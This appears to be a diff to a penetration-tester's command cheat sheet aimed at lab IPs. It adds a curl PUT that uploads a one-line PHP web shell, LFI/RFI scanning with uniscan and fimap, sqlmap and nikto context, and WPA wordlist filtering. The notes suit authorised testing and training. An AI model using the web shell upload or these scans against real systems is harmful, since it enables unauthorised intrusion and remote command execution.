@@ -83,6 +83,12 @@ GET /index
 ## HTTP methods. Inspecting the response of the OPTIONS verb on the /test directory.
 curl -v -X OPTIONS http://192.168.230.153/test/
 
+# check HTTP methods. Inspecting the response of the OPTIONS verb on the /test directory.
+curl -v -X OPTIONS http://192.168.230.153/test/
+
+# create a .php file in /test directory with curl. 
+curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.56.103/test/1.php
+
 #connect to a UDP port 
 nc -u localhost 161
 
@@ -229,7 +235,7 @@ ps -p $$
 echo $PATH
 
 ## chanage $PATH. As in add something to the PATH
-export PATH=/some/path  //redefineste path-ul 
+export PATH=/some/path1:/some/path2  //redefine $PATH bash variable
 
 == WEB APPLICATION SCANNERS ==
 ## scan Joomla
@@ -245,6 +251,15 @@ nikto -C all -h http://IP
 skipfish -m 5 -LY -S /usr/share/skipfish/dictionaries/complete.wl -o ./skipfish2 -u http://IP
 skipfish -o 202 http://192.168.1.202/wordpress   ## Using the given directory for output (-o 202) , scan the web application URL 
 ## (http://192.168.1.202/wordpress):
+
+## LFI, RFI, RCE
+uniscan -u http://192.168.44.134:10000/ -qweds
+### Test for LFI
+
+#Harvest links from a page (to test for LFI)
+fimap -H -u "http://192.168.56.129" -d 3 -w /tmp/urllist
+#test for LFI using harvested links
+fimap -H -u "http://192.168.56.129" -d 3 -w /tmp/urllist
 
   == SQL ==
 sqlmap -u "http://192.168.56.129/?page=login" -a --level=5
@@ -342,4 +357,18 @@ echo -n "QWxhZGRpbjpvcGVuIHNlc2FtZQ==" | base64 --decode
 
 # Decode Hexidecimal Encoded Values
 echo -n "46 4c 34 36 5f 33 3a 32 396472796 63637756 8656874" | xxd -r -ps
+
+# Remove words less than 8 characters (for WPA)
+cat really_big_list.txt | sort -u | pw-inspector -m 8 -M 63 > wpa_wordlist.txt
+
+#remove first 15 lines from a text file
+sed -i 1,15d ./somefile.txt
+
+#remove non numeric chaaracters from a file
+tr -cd '0-9\012' < ./myfile.sorted > myfile.sorted2
+
+#keep line/words with more than 32 characters/bits  (for MD5 filtering)
+awk 'length>=32' ./list.txt > ./list.sorted
+
+
 
